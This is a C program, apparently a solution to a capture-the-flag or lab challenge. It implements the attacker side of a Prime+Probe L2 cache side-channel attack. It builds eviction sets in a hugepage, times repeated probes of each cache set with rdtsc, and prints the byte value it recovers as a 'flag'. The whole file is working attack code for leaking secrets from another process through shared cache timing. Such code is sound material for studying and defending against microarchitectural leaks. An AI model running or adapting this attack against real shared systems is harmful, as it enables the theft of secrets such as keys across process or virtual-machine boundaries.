#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define NUM_VALUES 256
#define NUM_L2_CACHE_SETS 1024
#define WAYS 16
#define REPEATS 100
#define THRESHOLD 130

// Read timestamp counter
static inline uint64_t rdtsc() {
    unsigned int lo, hi;
    asm volatile ("mfence\nlfence\nrdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

// Allocate 2MB hugepage
char* get_buffer() {

    size_t size = 2 * 1024 * 1024;

    char *buf = mmap(NULL, size,
                     PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE |
                     MAP_HUGETLB | MAP_POPULATE,
                     -1, 0);

    if (buf == (void*)-1) {
        perror("mmap buffer");
        exit(1);
    }

    *((char*)buf) = 1;
    return buf;
}

// Build eviction set
void get_partial_eviction_set(char *buf, char *eviction_set[WAYS], int set_index) {

    for (int i = 0; i < WAYS; i++) {
        eviction_set[i] = buf + (i << 16) + (set_index << 6);
    }
}

int main() {

    char *buf = get_buffer();

    char *eviction_sets[NUM_L2_CACHE_SETS][WAYS];

    for (int i = 0; i < NUM_L2_CACHE_SETS; i++)
        get_partial_eviction_set(buf, eviction_sets[i], i);

    printf("Attacker ready. Prime+Probe starting...\n");

    volatile char tmp;

    while (1) {

        uint64_t scores[NUM_VALUES] = {0};

        for (int r = 0; r < REPEATS; r++) {

            for (int val = 0; val < NUM_VALUES; val++) {

                int set = val * 4;

                // PRIME
                for (int j = 0; j < WAYS; j++)
                    tmp = *(eviction_sets[set][j]);

                asm volatile("mfence; lfence");

                // PROBE
                uint64_t start = rdtsc();

                for (int j = 0; j < WAYS; j++)
                    tmp = *(eviction_sets[set][j]);

                uint64_t end = rdtsc();

                scores[val] += (end - start);
            }
        }

        int best_val = -1;
        uint64_t best_score = 0;

        for (int v = 0; v < NUM_VALUES; v++) {

            if (scores[v] > best_score) {
                best_score = scores[v];
                best_val = v;
            }
        }

        uint64_t avg = best_score / REPEATS;

        if (avg > THRESHOLD) {
            printf("Detected flag value: %d (latency=%lu)\n",
                   best_val, avg);
            fflush(stdout);
        }

        usleep(300000);
    }

    return 0;
}